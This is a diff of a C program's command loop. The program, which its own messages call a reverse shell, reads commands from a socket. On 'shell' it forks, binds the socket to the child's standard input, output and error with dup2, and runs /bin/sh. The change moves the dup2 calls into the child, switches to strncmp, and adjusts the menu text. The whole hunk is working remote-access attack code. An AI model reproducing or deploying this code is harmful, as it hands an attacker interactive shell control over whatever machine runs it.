@@ -30,34 +30,35 @@ int main(void){
   
   while (connection_established == 0){
       while((n = read(sockt, buffer, MAXBUF)) > 0){
-     	
-      	if(strcmp(buffer, "help\n") == 0){
-	  char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\n\n";
+      	if(strncmp(buffer, "help\n", 5) == 0){
+	  char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\n\n";
 
 	  write(sockt, help, strlen(help));
 	}
-      	else if(strcmp(buffer, "shell\n") == 0){
+  else if(strncmp(buffer, "shell\n", 6) == 0){
 
 	  int status = 0;
 	  pid_t wpid, child_pid;
-	  char* shell_msg = "\nStarting reverse shell session\n";
+	  char* shell_msg = "\nReverse shell session started\n";
 	  write(sockt, shell_msg, strlen(shell_msg));
-          dup2(sockt, 0);
-	  dup2(sockt, 1);
-	  dup2(sockt, 2);
+  
 	  char *const argv[] = {"/bin/sh", NULL};
 	  if((child_pid = fork()) == 0){
-	  	execve("/bin/sh", argv, NULL);    // Create a child process and start shell inside of it
-		exit(0);
-     	  }
+            dup2(sockt, 0);
+	    dup2(sockt, 1);
+	    dup2(sockt, 2);
+	    execve("/bin/sh", argv, NULL);    // Create a child process and start shell inside of it
+   	    exit(0);
+    }
 	  while ((wpid = wait(&status)) > 0);     // Make the parent process wait for child process to terminate
 	
-	  char* test_msg = "Exiting reverse shell session\n";  
+	  char* test_msg = "\nExiting reverse shell session\n";  
 	  write(sockt, test_msg, strlen(test_msg));
 	}
+	
 	else{
-	  char* invalid = "Invalid command session command, type \"help\" for a list of commands\n";		
-	  write(sockt, invalid, strlen(invalid));
+	    char* invalid = "Invalid command session command, type \"help\" for a list of commands\n";		
+	    write(sockt, invalid, strlen(invalid));
 	}		
     }
    }
